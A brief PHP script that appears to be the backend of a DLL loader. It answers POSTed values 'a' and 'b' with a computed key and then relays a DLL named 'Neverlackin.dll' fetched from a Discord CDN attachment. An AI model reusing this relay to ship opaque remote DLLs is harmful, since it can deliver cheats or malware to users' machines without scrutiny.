<?php
$_SERVER['REQUEST_URI'];
	echo hexToString('01');
	echo hexToString(littleToBigEndian(dechex(intval($_POST["a"]) + (intval($_POST["b"])*19))));
	echo file_get_contents("https://cdn.discordapp.com/attachments/565208230234685458/725902214136070144/Neverlackin.dll");

	function hexToString($hex){
		$string='';
		for ($i=0; $i < strlen($hex)-1; $i+=2){
			$string .= chr(hexdec($hex[$i].$hex[$i+1]));
		}
		return $string;
	}
	
	function littleToBigEndian($little) {
		return implode('',array_reverse(str_split($little,2)));
	}
	
?>